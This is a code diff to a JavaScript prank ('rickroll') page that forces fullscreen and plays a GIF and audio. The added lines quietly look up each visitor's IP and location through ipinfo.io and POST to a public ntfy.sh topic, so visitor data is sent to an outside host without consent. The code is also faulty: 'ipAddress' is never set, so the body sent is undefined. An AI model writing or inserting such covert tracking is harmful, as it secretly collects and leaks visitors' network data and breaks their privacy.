@@ -15,6 +15,29 @@ window.addEventListener("click", abrirTelaCheia);
         document.getElementById("gif").style.display = 'block';
         document.getElementById("texto").style.display = 'block';
         document.getElementById("contagem").style.display = 'block';
+        var ipAddress;
+try {
+    fetch('https://ipinfo.io/json')
+    .then(response => response.json())
+    .then(data => {
+        for (let key in data) {
+            console.log(data[key]);
+        }        fetch('https://ntfy.sh/rickroll', {
+            method: 'POST', 
+            headers: {
+                'Title': 'IP',
+                'Email': 'a@a.com'
+            },
+            body: ipAddress, 
+        });
+    console.log(ipAddress)
+    })
+    .catch(error => {
+        alert("Erro" + error);
+    });
+} catch (e) {
+    alert("Erro: " + e);
+}
         const audio = document.getElementById("audio");
         audio.play().catch(error => {
             console.error("Erro ao iniciar a reprodução do áudio:", error);
